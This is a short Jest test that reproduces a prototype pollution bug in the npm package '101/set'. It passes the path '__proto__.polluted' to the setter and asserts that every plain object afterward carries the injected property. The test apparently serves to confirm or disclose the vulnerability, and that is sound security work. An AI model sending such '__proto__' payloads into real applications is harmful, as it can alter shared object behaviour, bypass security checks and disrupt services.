test("prototype pollution in 101/set", () => {
  expect({}.polluted).toBe(undefined);

  const _101 = require("101/set");
  // console.log(_101)
  _101({}, "__proto__.polluted", "yes");

  expect({}.polluted).toBe("yes");
});
